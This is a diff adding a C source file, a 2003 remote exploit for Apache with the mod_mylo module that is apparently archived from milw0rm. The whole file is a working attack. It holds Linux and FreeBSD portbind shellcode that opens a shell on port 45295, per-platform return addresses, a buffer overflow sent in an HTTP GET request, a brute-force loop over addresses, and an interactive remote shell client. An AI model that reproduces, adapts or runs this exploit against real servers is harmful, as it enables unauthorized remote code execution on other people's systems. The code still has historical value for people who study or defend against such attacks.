@@ -1,0 +1,338 @@
+/*
+  Apache + mod_mylo remote exploit
+  By Carl Livitt / July 2003
+  carllivitt at hush dot com
+
+  Public release - Linux and FreeBSD targets.
+*/
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <sys/socket.h>
+#include <net/if.h>
+#include <netinet/in.h>
+#include <netinet/tcp.h>
+#include <arpa/inet.h>
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+#include <signal.h>
+#include <netdb.h>
+#include <time.h>
+#include <stdarg.h>
+
+#define SIZ 8096
+#define HTTP_PORT 80
+#define SHELL_PORT 45295
+#define SOCKET_ERR -2
+#define CONNECT_ERR -3
+#define HOST_NOT_RESOLVED -4
+#define BRUTE_FORCE_EXHAUSTED -5
+#define SHELL_NOT_FOUND -7
+#define SUCCESS 1
+#define FAILED 0
+
+// The following shellcode had 0x3f (?) chars in it which
+// cause termination of our HTTP GET before the whole
+// shellcode is written to the stack. The 0x3f's are
+// needed because they are the dup2() syscall numbers. So,
+// I've changed them to 0x3e's and INC'd them before doing
+// an INT 0x80. Other than that, this shellcode is eSDee's.
+// --------
+// linux x86 shellcode by eSDee of Netric (www.netric.org)
+// 200 byte - forking portbind shellcode - port=0xb0ef(45295)
+char linux_shellcode[]=
+        "\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
+        "\x06\x51\xb1\x01\x51\xb1\x02\x51"
+        "\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
+        "\x89\xc1\x31\xc0\x31\xdb\x50\x50"
+        "\x50\x66\x68\xb0\xef\xb3\x02\x66"
+        "\x53\x89\xe2\xb3\x10\x53\xb3\x02"
+        "\x52\x51\x89\xca\x89\xe1\xb0\x66"
+        "\xcd\x80\x31\xdb\x39\xc3\x74\x05"
+        "\x31\xc0\x40\xcd\x80\x31\xc0\x50"
+        "\x52\x89\xe1\xb3\x04\xb0\x66\xcd"
+        "\x80\x89\xd7\x31\xc0\x31\xdb\x31"
+        "\xc9\xb3\x11\xb1\x01\xb0\x30\xcd"
+        "\x80\x31\xc0\x31\xdb\x50\x50\x57"
+        "\x89\xe1\xb3\x05\xb0\x66\xcd\x80"
+        "\x89\xc6\x31\xc0\x31\xdb\xb0\x02"
+        "\xcd\x80\x39\xc3\x75\x40\x31\xc0"
+        "\x89\xfb\xb0\x06\xcd\x80\x31\xc0"
+        "\x31\xc9\x89\xf3\xb0\x3e\xfe\xc0\xcd\x80"
+        "\x31\xc0\x41\xb0\x3e\xfe\xc0\xcd\x80\x31"
+        "\xc0\x41\xb0\x3e\xfe\xc0\xcd\x80\x31\xc0"
+        "\x50\x68\x2f\x2f\x73\x68\x68\x2f"
+        "\x62\x69\x6e\x89\xe3\x8b\x54\x24"
+        "\x08\x50\x53\x89\xe1\xb0\x0b\xcd"
+        "\x80\x31\xc0\x40\xcd\x80\x31\xc0"
+        "\x89\xf3\xb0\x06\xcd\x80\xeb\x99";
+
+// This shellcode is unchanged (why reinvent the wheel ?):
+// --------
+/* BSD x86 shellcode by eSDee of Netric (www.netric.org)
+ * 194 byte - forking portbind shellcode - port=0xb0ef(45295)
+ */
+char freebsd_shellcode[]=
+        "\x31\xc0\x31\xdb\x53\xb3\x06\x53"
+        "\xb3\x01\x53\xb3\x02\x53\x54\xb0"
+        "\x61\xcd\x80\x89\xc7\x31\xc0\x50"
+        "\x50\x50\x66\x68\xb0\xef\xb7\x02"
+        "\x66\x53\x89\xe1\x31\xdb\xb3\x10"
+        "\x53\x51\x57\x50\xb0\x68\xcd\x80"
+        "\x31\xdb\x39\xc3\x74\x06\x31\xc0"
+        "\xb0\x01\xcd\x80\x31\xc0\x50\x57"
+        "\x50\xb0\x6a\xcd\x80\x31\xc0\x31"
+        "\xdb\x50\x89\xe1\xb3\x01\x53\x89"
+        "\xe2\x50\x51\x52\xb3\x14\x53\x50"
+        "\xb0\x2e\xcd\x80\x31\xc0\x50\x50"
+        "\x57\x50\xb0\x1e\xcd\x80\x89\xc6"
+        "\x31\xc0\x31\xdb\xb0\x02\xcd\x80"
+        "\x39\xc3\x75\x44\x31\xc0\x57\x50"
+        "\xb0\x06\xcd\x80\x31\xc0\x50\x56"
+        "\x50\xb0\x5a\xcd\x80\x31\xc0\x31"
+        "\xdb\x43\x53\x56\x50\xb0\x5a\xcd"
+        "\x80\x31\xc0\x43\x53\x56\x50\xb0"
+        "\x5a\xcd\x80\x31\xc0\x50\x68\x2f"
+        "\x2f\x73\x68\x68\x2f\x62\x69\x6e"
+        "\x89\xe3\x50\x54\x53\x50\xb0\x3b"
+        "\xcd\x80\x31\xc0\xb0\x01\xcd\x80"
+        "\x31\xc0\x56\x50\xb0\x06\xcd\x80"
+        "\xeb\x9a";
+
+struct {
+        char *platform;
+        unsigned long bruteStart, bruteEnd;
+        unsigned long retAddr;
+        int offset, len;
+        char *shellcodePtr;
+} targets[]= {
+        { "SuSE 8.1, Apache 1.3.27 (installed from source) (default)", 0x08117c04,
+0x08117dff, 0xbfffe9f0, 500, 4104, linux_shellcode },
+        { "RedHat 7.2, Apache 1.3.20 (installed from RPM)", 0x08105104, 0x081051ff,
+0xbfffe0b0, 1000, 4104, linux_shellcode },
+        { "RedHat 7.3, Apache 1.3.23 (installed from RPM)", 0x080ef304, 0x080ef3ff,
+0xbfffe190, 750, 4104, linux_shellcode },
+        { "FreeBSD 4.8, Apache 1.3.27 (from Ports)", 0x080bf004, 0x080bf0ff, 0xbfbfea50
+,3500, 4096, freebsd_shellcode },
+        NULL
+};
+
+char usage[]=
+"Apache + mod_mylo remote exploit\n"
+"By Carl Livitt (carllivitt at hush dot com)\n\n"
+"Arguments: \n"
+"  -t target       Attack 'target' host\n"
+"  -T platform     Use parameters for target 'platform'\n"
+"  -h              This help.\n";
+
+void my_send(int, char *, ...);
+void my_recv(int);
+void make_exploitbuf(char *);
+int connect_to_host(int);
+int attempt_exploit(void);
+void my_sleep(int n);
+
+unsigned long retAddr=0,magic_r=0,MAGIC_R_START,MAGIC_R_END, exactPointerAddy=0;
+char buf[SIZ], host[SIZ]="";
+int useTarget=0;
+struct hostent *hostStruct;
+
+main(int argc, char **argv) {
+        int ch, i;
+
+        while((ch=getopt(argc, argv, "t:T:e:hr:"))!=-1) {
+                switch(ch) {
+                        case 't':
+                                strncpy(host, optarg, SIZ-1);
+                                break;
+                        case 'T':
+                                useTarget=atoi(optarg);
+                                break;
+                        case 'e':
+                                exactPointerAddy=strtoul(optarg,NULL,16);
+                                break;
+                        case 'r':
+                                retAddr=strtoul(optarg,NULL,16);
+                                break;
+                        case 'h':
+                        default:
+                                printf("%s\n",usage);
+                                printf("Available platforms:\n");
+                                for(i=0;targets[i].platform;i++)
+                                        printf("%2d. %s\n", i, targets[i].platform);
+                                printf("\n");
+                                exit(0);
+                                break; // it's good practice :)
+                }
+        }
+
+        // Sanity check
+        if(!retAddr && exactPointerAddy) {
+                printf("[*] You must give RET address when specifying a pointer address\n");
+                printf("    A good place to start is 0xbfffe0b0(linux) or 0xbfbfe0b0(freeBSD)\n");
+		printf("    Also remember to pass a -T x flag... things will be unpredictable\n");
+		printf("    if you don't!\n");
+                exit(0);
+        }
+
+        if((hostStruct=gethostbyname(host))==NULL) {
+               printf("[*] Couldn't resolve host %s\nUse '%s -h' for help\n", host,argv[0]);
+                exit(0);
+        }
+
+        switch(attempt_exploit()) {
+                case HOST_NOT_RESOLVED:
+                        printf("[*] Couldn't connect to host: %s not found.\n", host);
+                        break;
+                case SOCKET_ERR:
+                        printf("[*] Couldn't grab a socket!\n");
+                        break;
+                case CONNECT_ERR:
+                        printf("[*] Connection to %s was rejected\n",host);
+                        break;
+                case SHELL_NOT_FOUND:
+                        printf("[*] This attempt failed ...\n");
+                        break;
+                case BRUTE_FORCE_EXHAUSTED:
+                        printf("[*] Bruteforce failed.\n");
+                        break;
+                case SUCCESS:
+                        break;
+                default:
+                        printf("[*] ERROR: There was no error!\n");
+                        break;
+        }
+
+        printf("\nHave a nice day!\n");
+        exit(0);
+}
+
+int attempt_exploit(void) {
+	fd_set rfds;
+	int sock,retVal,r;
+
+	if(exactPointerAddy) {
+		printf("[-] Using 0x%08x for pointer addy\n", exactPointerAddy);
+		if((sock=connect_to_host(HTTP_PORT))<=0)
+			return sock;
+		magic_r=exactPointerAddy;
+		make_exploitbuf(buf);
+		my_send(sock, buf);
+		my_recv(sock);
+		close(sock);
+		my_sleep(100000);
+                if((sock=connect_to_host(SHELL_PORT))<=0) {
+			return sock;
+		}
+	} else { // Do crappy bruteforce loop
+		printf("[-] Attempting attack [ %s ] ...\n", targets[useTarget].platform);
+		MAGIC_R_START=targets[useTarget].bruteStart;
+		MAGIC_R_END=targets[useTarget].bruteEnd;
+		retAddr=targets[useTarget].retAddr;
+		for(magic_r=MAGIC_R_START; magic_r<=MAGIC_R_END; magic_r++) {
+			printf("[-] Trying 0x%08x ... \r", magic_r);fflush(stdout);
+			if((sock=connect_to_host(HTTP_PORT))<=0)
+				return sock;
+			make_exploitbuf(buf);
+			my_send(sock, buf);
+			my_recv(sock);
+			close(sock);
+			my_sleep(50000);
+			if((sock=connect_to_host(SHELL_PORT))>=SUCCESS) {
+				printf("\n[-] Found request_rec address @ 0x%08x\n", magic_r);
+				break;
+			}
+		}
+		if(magic_r>MAGIC_R_END)
+			return BRUTE_FORCE_EXHAUSTED;
+	}
+
+        printf("[-] Connected to %s! You can type commands now:\n", host);
+
+        // Now let the attacker issue commands to the remote
+        // shell, just as if (s)he had launched 'nc host 45295'.
+        do {
+                FD_ZERO(&rfds);
+                FD_SET(0, &rfds);
+                FD_SET(sock, &rfds);
+                retVal=select(sock+1, &rfds, NULL, NULL, NULL);
+                if(retVal) {
+                        if(FD_ISSET(sock, &rfds)) {
+                                buf[(r=recv(sock, buf, SIZ-1,0))]='\0'; // bad!
+                                printf("%s", buf);
+                        }
+                        if(FD_ISSET(0, &rfds)) {
+                                buf[(r=read(0, buf, SIZ-1))]='\0'; // bad!
+                                send(sock, buf, strlen(buf), 0);
+                        }
+
+                }
+        } while(retVal && r); // loop until connection terminates
+
+        close(sock);
+        return SUCCESS;
+}
+
+// Given a port number, connects to an already resolved hostname...
+// connects a TCP stream and returns a socket number (or returns error)
+int connect_to_host(int p) {
+        int sock;
+        struct sockaddr_in saddr;
+
+        if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)
+                return SOCKET_ERR;
+        memset((void *)&saddr, 0, sizeof(struct sockaddr_in));
+        saddr.sin_family=AF_INET;
+        saddr.sin_addr.s_addr=*((unsigned long *)hostStruct->h_addr_list[0]);
+        saddr.sin_port=htons(p);
+        if(connect(sock, (struct sockaddr *)&saddr, sizeof(saddr))<0) {
+                close(sock);
+                return CONNECT_ERR;
+        } else
+                return sock;
+}
+
+void make_exploitbuf(char *b) {
+        unsigned long *ptr;
+        char *sc=(char *)&targets[useTarget].shellcodePtr[0];
+
+        memset(b,0x00,SIZ-1);
+        strcat(b,"GET ");
+        memset(b+4,0x90,targets[useTarget].len);
+        memcpy((b+targets[useTarget].len)-(strlen(sc)+targets[useTarget].offset)-9,sc,strlen(sc));
+        ptr=(unsigned long *)&b[strlen(b)];
+        *(ptr++)=retAddr;
+        *ptr=magic_r;
+        strcat(b, "\n\n");
+}
+
+// Handy little function to send formattable data down a socket.
+void my_send(int s, char *b, ...) {
+        va_list ap;
+        char *buf;
+
+        va_start(ap,b);
+        vasprintf(&buf,b,ap);
+        send(s,buf,strlen(buf),0);
+        va_end(ap);
+        free(buf);
+}
+
+// Another handy function to read data from a socket.
+void my_recv(int s) {
+        int len;
+        char buf[SIZ];
+
+        len=recv(s, buf, SIZ-1, 0);
+        buf[len]=0;
+}
+
+// Wrapper for nanosleep()... just pass 'n' nanoseconds to it.
+void my_sleep(int n) {
+        struct timespec t;
+        t.tv_sec=0;
+        t.tv_nsec=n;
+        nanosleep(&t,&t);
+}
+
+// milw0rm.com [2003-07-28]
